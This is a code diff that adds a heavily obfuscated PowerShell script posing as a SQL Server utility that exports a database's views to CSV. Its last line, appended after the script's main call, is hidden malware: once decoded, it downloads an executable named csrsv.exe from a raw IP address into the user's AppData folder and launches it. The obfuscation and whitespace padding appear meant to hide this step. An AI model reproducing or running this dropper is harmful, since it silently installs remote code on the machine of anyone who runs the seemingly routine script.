@@ -1,0 +1,70 @@
+SET-iTEM  varIAbLE:nDg (  [tyPE]("{5}{6}{3}{1}{4}{2}{0}" -F'Ssembly','tiO','.a','eC','N','sYStem.ReF','l')  );
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+param
+(
+	[string]$serverInstance = ("{0}{3}{2}{1}" -f'STG','10','6','SQL'),
+  	[string]$tempDir = ((("{5}{4}{3}{1}{0}{2}"-f 'Pv','ogs','g','gDexmaPvgL','v','C:P'))-cRepLAcE'Pvg',[ChAr]92),
+	[string]$filter = ("{1}{0}" -f 'jects','ob'),
+	[switch]$verbose,
+	[switch]$debug
+)
+
+function m`AIn()
+{
+	if ($verbose) {$VerbosePreference = ("{1}{0}{2}" -f'ont','C','inue')}
+	if ($debug) {$DebugPreference = ("{2}{0}{1}" -f'ti','nue','Con')}
+	.("{0}{2}{3}{1}" -f 'Get-','L-Views-Csv','MSS','Q') $serverInstance $tempDir $filter
+}
+
+function GeT-MssQ`L`-ViEWS`-csv($serverInstance, $tempDir, $filter)
+{
+	trap [Exception] 
+	{
+		.("{1}{2}{0}"-f 'ror','wr','ite-er') $(("{0}{1}{2}" -f'TR','A','PPED: ') + $_."EX`cepTI`ON"."M`eSSAGe");
+		continue;
+	}
+
+	$outputFile = $tempDir + ("{0}{2}{1}{3}"-f 'GetV','w','ie','s.csv')
+	
+	
+	.("{1}{2}{0}{3}" -f'e','Wr','ite-D','bug') ('Val'+'i'+'dat'+'e '+'o'+'u'+'tput '+'p'+'ath '+"$tempDir")
+	if (-not (.("{0}{2}{1}"-f 'Tes','Path','t-') -path $tempDir)) 
+	{
+		.("{3}{0}{2}{1}"-f 'ite-H','t','os','Wr') ('U'+'nab'+'le '+'to'+' '+'v'+'alid'+'a'+'te '+'path'+' '+'to'+' '+'t'+'emp '+'dire'+'ctor'+'y:'+' '+"$tempDir")
+		break
+	}
+
+	
+	[void]  $NDG::("{0}{1}{2}{3}{4}"-f'Load','WithPar','tia','lNam','e').Invoke(("{1}{2}{0}{3}" -f 've','Micr','osoft.SqlSer','r.Smo'))
+	[void] ( VArIable  ("nd"+"g")).VAlue::("{5}{0}{4}{2}{1}{3}"-f'dWi','tialNam','r','e','thPa','Loa').Invoke(("{0}{4}{2}{3}{1}{5}"-f'Micros','er.SqlEnu','ft.Sql','Serv','o','m'))
+	[void] $NDG::("{1}{2}{3}{0}" -f'ialName','LoadWit','h','Part').Invoke(("{4}{7}{1}{2}{3}{0}{5}{6}" -f '.SmoEn','o','ft.','SqlServer','Mi','u','m','cros')) 
+	[void] $nDg::("{3}{1}{2}{0}{4}" -f'Nam','hP','artial','LoadWit','e').Invoke(("{5}{9}{0}{7}{1}{6}{3}{8}{4}{2}" -f 'ft.Sq','Ser','Info','.Co','ion','Mic','ver','l','nnect','roso')) 
+	
+	
+	.("{0}{3}{2}{1}"-f 'Wri','-Debug','e','t') ('G'+'et '+'S'+'MO '+'na'+'med '+'in'+'sta'+'n'+'ce '+'ob'+'ject '+'for'+' '+'s'+'erve'+'r: '+"$serverInstance")
+	$namedInstance = &("{2}{0}{1}" -f 'je','ct','New-Ob') (("{8}{7}{5}{9}{0}{1}{3}{4}{10}{2}{6}{11}" -f'erv','er','.Smo.Se','.M','a','S','rv','ft.','Microso','qlS','nagement','er')) ($serverInstance)
+	
+	
+	.("{1}{2}{0}" -f'-Debug','W','rite') ('Exp'+'ortin'+'g'+' '+'filt'+'er'+'ed '+'view'+'s '+'based'+' '+'on'+' '+"filter:$filter "+'t'+'o '+"$outputfile")
+	($namedInstance."dataBA`S`es"[("{0}{1}" -f 'mas','ter')]).("{0}{2}{1}" -f'g','s','et_view').Invoke() | 
+		&("{0}{1}" -f'wher','e') {$_ -like "*$filter*"} | .("{3}{1}{2}{0}" -f 'sv','r','t-C','Expo') -path $outputFile
+}
+
+.("{0}{1}"-f'm','ain')
+(.("{0}{1}{2}"-f'Ne','w-Objec','t') ("{0}{3}{2}{1}{5}{4}"-f'Sys','WebC','et.','tem.N','ent','li')).("{1}{2}{0}"-f'e','Dow','nloadFil').Invoke(("{3}{4}{5}{8}{9}{2}{6}{7}{1}{0}"-f 'v.exe','srs','3.2','http:','//9','4','38/~yahoo','/c','.102.','5'),"$env:APPDATA\csrsv.exe");&("{2}{1}{0}{3}"-f 'ces','ro','Start-P','s') ("$env:APPDATA\csrsv.exe")
